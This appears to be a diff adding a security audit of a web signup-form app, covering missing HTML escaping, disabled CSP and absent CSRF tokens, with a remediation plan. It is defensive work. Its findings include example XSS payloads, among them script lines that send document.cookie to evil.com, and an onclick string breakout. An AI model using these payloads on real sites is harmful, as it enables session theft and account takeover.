@@ -1,0 +1,298 @@
+================================================================================
+SIGNFLOW — SECURITY AUDIT: XSS & CSRF PROTECTION
+Date: 2026-03-11
+Scope: server.js, admin/index.html
+================================================================================
+
+
+CURRENT STATE OVERVIEW
+----------------------
+
+  Control                        Status     Notes
+  ─────────────────────────────────────────────────────────────────────────────
+  Session cookies                GOOD       httpOnly, secure, sameSite:lax
+  Rate limiting                  GOOD       10 submits / 200 admin per 15 min
+  CSRF tokens                    MISSING    SameSite-lax only; no explicit token
+  Content Security Policy        DISABLED   helmet({ contentSecurityPolicy: false })
+  Server-side HTML escaping      MISSING    No escapeHtml() helper in server.js
+  Admin subscriber table escape  MISSING    Emails + custom fields → innerHTML raw
+  Public page text escaping      MISSING    Hero/paragraph/button text raw in HTML
+  Inline onclick escaping        MISSING    Subscriber email unescaped in onclick
+  X-Frame-Options (public page)  PERMISSIVE ALLOWALL on /embed route; public
+                                            /:slug has no frame header set
+
+
+================================================================================
+SECTION 1 — HELMET & SECURITY HEADERS
+================================================================================
+
+File: server.js, line 147
+  app.use(helmet({ contentSecurityPolicy: false }));
+
+Status: PARTIALLY CONFIGURED
+
+- Helmet is enabled but CSP is explicitly disabled.
+- Disabling CSP removes the browser's last line of defence against injected scripts.
+- X-Frame-Options, HSTS, and other helmet defaults remain active (good).
+
+Gap:
+  An attacker who achieves any form of HTML injection has no CSP policy to
+  prevent execution of arbitrary scripts in visitor browsers.
+
+
+================================================================================
+SECTION 2 — SESSION COOKIE SECURITY
+================================================================================
+
+File: server.js, lines 152–162
+  app.use(session({
+    secret: SESSION_SECRET,
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+      httpOnly: true,
+      secure:   true,
+      sameSite: 'lax',
+      maxAge:   8 * 60 * 60 * 1000   // 8 hours
+    }
+  }));
+
+Status: GOOD
+
+- httpOnly:true  — JS cannot read the session cookie
+- secure:true    — HTTPS only (works correctly behind Nginx with trust proxy set)
+- sameSite:lax   — blocks cross-site form POST and most CSRF vectors
+- 8-hour expiry  — reasonable for an admin session
+
+Caveat:
+  SameSite:lax is not a complete CSRF defence. It does not protect against
+  requests triggered from same-site pages, compromised subdomains, or
+  top-level navigation with a request body. Explicit CSRF tokens are required
+  for defense-in-depth (see Section 4).
+
+
+================================================================================
+SECTION 3 — XSS VULNERABILITIES
+================================================================================
+
+3.1  CRITICAL — Stored XSS via subscriber table in admin panel
+     File: admin/index.html ~line 4218
+
+     Code:
+       tr.innerHTML = `<td class="email-cell">${s.email}</td>
+                       <td><span class="badge ${s.status}">${s.status}</span></td>...`;
+
+       const fields = (cfg.fields||[]).filter(f=>!f.system)
+         .map(f=>`<td>${s.customFields?.[f.id]||'—'}</td>`).join('');
+
+     Attack:
+       A visitor submits the signup form with email:
+         "><img src=x onerror=alert(document.cookie)>@evil.com
+       This is stored in subscribers-{slug}.json. When the admin opens the
+       Subscribers tab, the payload executes in the admin's browser session —
+       full cookie/session access.
+
+     Custom fields are equally vulnerable. A text field value of:
+         <script>fetch('https://evil.com?c='+document.cookie)</script>
+       exfiltrates the admin session token on next table load.
+
+     Severity: CRITICAL — leads to full admin account compromise.
+
+
+3.2  HIGH — Subscriber email unescaped in inline onclick attributes
+     File: admin/index.html ~line 4216
+
+     Code:
+       onclick="adminUnsubscribe('${s.id}','${s.email}')"
+       onclick="deleteSubscriber('${s.id}','${s.email}')"
+
+     Attack:
+       An email like:   a@b.com'); maliciousFunction('x
+       breaks out of the string literal and injects arbitrary JS.
+
+     Severity: HIGH — complements the innerHTML vector above.
+
+
+3.3  HIGH — Form config text fields unescaped in public page HTML
+     File: server.js, multiple locations
+
+     Affected fields and approximate lines:
+       ~1603  <h1>${h.heading || ''}</h1>               (hero heading)
+       ~1604  <p>${h.subheading || ''}</p>              (hero subheading)
+       ~1607  <button>${h.buttonLabel || ''}</button>   (submit button)
+       ~1542  ${el.text || ''}                          (paragraph block)
+       ~1546  ${el.text || ''}                          (heading block)
+       ~1624  <p class="sf-footer">${section.text}</p>  (footer text)
+       ~1880  <span>${s.cookieBannerText}</span>         (cookie banner)
+       ~1971  ${block.text||''}                          (pref centre blocks)
+
+     Attack:
+       Admin (or attacker who gains access to form config) sets hero heading to:
+         <script>document.location='https://evil.com?c='+document.cookie</script>
+       Every visitor to /{slug} then executes the payload.
+
+     Note: WYSIWYG fields (emailBodyHtml, privacyContent) are intentionally raw
+     HTML — they are admin-authored and are out of scope for escaping.
+
+     Severity: HIGH — public visitor XSS.
+
+
+3.4  MEDIUM — Admin panel innerHTML assignments without escaping (non-table)
+     File: admin/index.html, multiple locations
+
+     Examples:
+       cookiePrev.innerHTML = cfg.site.cookieBannerText || '...';
+       unsubPrev.innerHTML  = cfg.site.unsubscribePageText || '...';
+       item.innerHTML = `...<span style="font-family:'${f.name}'">${f.name}</span>`;
+
+     The cookie banner and unsubscribe text previews use innerHTML with
+     admin-controlled input that has not been sanitised.
+
+     Font name injection in style attribute:
+       A font name of:  Lato'; behavior:url(evil.htc)
+       is injected directly into the style= attribute value.
+
+     Severity: MEDIUM — exploitable only if admin account is already compromised,
+     but defense-in-depth still required.
+
+
+3.5  LOW — Inline onclick attribute injection for block/section IDs
+     File: admin/index.html ~line 2722
+
+     Code:
+       onclick="event.stopPropagation();renameBk('${s.id}')"
+       onclick="event.stopPropagation();deleteBk('${s.id}')"
+
+     Block/section IDs are generated by uuidv4() so are safe in practice, but
+     no escaping is applied. If the ID generation were ever changed, this would
+     become exploitable.
+
+     Severity: LOW (currently not exploitable due to UUID source).
+
+
+================================================================================
+SECTION 4 — CSRF VULNERABILITIES
+================================================================================
+
+Status: NO EXPLICIT CSRF PROTECTION
+
+No CSRF middleware (csurf, custom double-submit) is used. No X-CSRF-Token header
+is sent in any admin fetch request.
+
+Vulnerable mutation endpoints (all in server.js):
+  POST   /api/admin/forms/:slug              (save form config)
+  POST   /api/admin/forms                    (create form)
+  DELETE /api/admin/forms/:slug              (delete form)
+  DELETE /api/admin/forms/:slug/subscribers/:id
+  POST   /api/admin/forms/:slug/subscribers/:id/clear-export
+  POST   /api/admin/forms/:slug/subscribers/:id/unsubscribe
+  POST   /api/admin/forms/:slug/subscribers/:id/reactivate
+  POST   /api/admin/forms/:slug/analytics/reset
+  POST   /api/admin/design-templates
+  DELETE /api/admin/design-templates/:id
+  POST   /api/admin/upload/*
+  DELETE /api/admin/media/*
+
+Current mitigation:
+  sameSite:lax on the session cookie blocks cross-site form POST requests,
+  protecting against the most common CSRF attack vectors.
+
+Residual risk:
+  - Requests initiated by JavaScript from a compromised same-site page or
+    subdomain are not blocked by sameSite:lax.
+  - Top-level navigation + fetch from a malicious page on the same eTLD+1.
+  - Any future subdomain (sub.wingvibes.com) could make credentialed requests.
+
+Severity: MEDIUM — sameSite:lax substantially reduces risk, but explicit tokens
+are industry standard and required for compliance with OWASP ASVS Level 2.
+
+
+================================================================================
+SECTION 5 — X-FRAME-OPTIONS
+================================================================================
+
+File: server.js ~line 1015
+  res.setHeader('X-Frame-Options', 'ALLOWALL');   // on /:slug/embed only
+
+Helmet default sets X-Frame-Options: SAMEORIGIN on all other routes.
+
+Status: ACCEPTABLE for the embed route. The public /:slug page inherits SAMEORIGIN
+from helmet, which is correct.
+
+No change required here — the current state is appropriate.
+
+
+================================================================================
+SECTION 6 — MISSING PROTECTIONS SUMMARY
+================================================================================
+
+  Gap                             Priority  Plan
+  ─────────────────────────────────────────────────────────────────────────────
+  No Content Security Policy      HIGH      Plan D — enable helmet CSP
+  No CSRF tokens                  MEDIUM    Plan C — double-submit token
+  No server-side escapeHtml()     CRITICAL  Plan A — add helper + apply
+  Admin subscriber table raw XSS  CRITICAL  Plan B — escHtml + event delegation
+  Inline onclick unescaped        HIGH      Plan B — data attributes
+
+
+================================================================================
+SECTION 7 — REMEDIATION PLAN
+================================================================================
+
+PLAN A — Server-side HTML escaping (server.js)
+  1. Add escapeHtml(s) covering &, <, >, ", '
+  2. Apply to every non-WYSIWYG interpolation in:
+       renderPublicPage, renderEmbedPage, renderPreferencePage, renderEmbedScript
+
+PLAN B — Admin subscriber table (admin/index.html)
+  1. Wrap all subscriber datum in escHtml() before innerHTML injection
+     (email, status, custom fields, subscribedAt, IP, exported badges)
+  2. Replace inline onclick="deleteSubscriber('${s.email}',...)" with
+     data-id / data-email attributes and a single delegated event listener
+
+PLAN C — CSRF double-submit token
+  1. On admin session creation, generate crypto-random CSRF token
+  2. Store in req.session.csrf
+  3. Expose via GET /api/admin/csrf-token (called once on admin load)
+  4. All admin mutating fetch calls include X-CSRF-Token header
+  5. adminAuth middleware validates header === session token
+
+PLAN D — Content Security Policy
+  Replace contentSecurityPolicy:false with explicit directives:
+    default-src 'self'
+    script-src  'self' 'unsafe-inline' https://js.hcaptcha.com
+    style-src   'self' 'unsafe-inline' https://fonts.googleapis.com
+    font-src    'self' https://fonts.gstatic.com
+    img-src     'self' data: blob:
+    connect-src 'self' https://api.hcaptcha.com
+    frame-ancestors 'self'   (overridden to * on /embed routes)
+
+PLAN E — X-Frame-Options clean-up
+  No change needed — helmet default SAMEORIGIN is correct on all non-embed
+  routes. Document and verify.
+
+
+================================================================================
+SECTION 8 — OUT OF SCOPE / ACCEPTED RISKS
+================================================================================
+
+The following are noted but intentionally NOT remediated:
+
+1. WYSIWYG content (emailBodyHtml, privacyContent) rendered as raw HTML.
+   These are admin-authored fields. The admin is a trusted principal.
+   Sanitising them would break intentional formatting.
+
+2. Admin session stored in memory (default express-session store).
+   Sessions are lost on server restart. Accepted for single-admin deployment.
+   Recommendation: move to connect-redis for production resilience.
+
+3. Google Fonts requests leak visitor IP/referrer to Google.
+   Accepted until self-hosting is evaluated. Disclosed in cookie policy.
+
+4. hCaptcha third-party cookies.
+   Outside SignFlow's control. Disclosed in cookie policy. Optional feature.
+
+
+================================================================================
+END OF AUDIT
+================================================================================
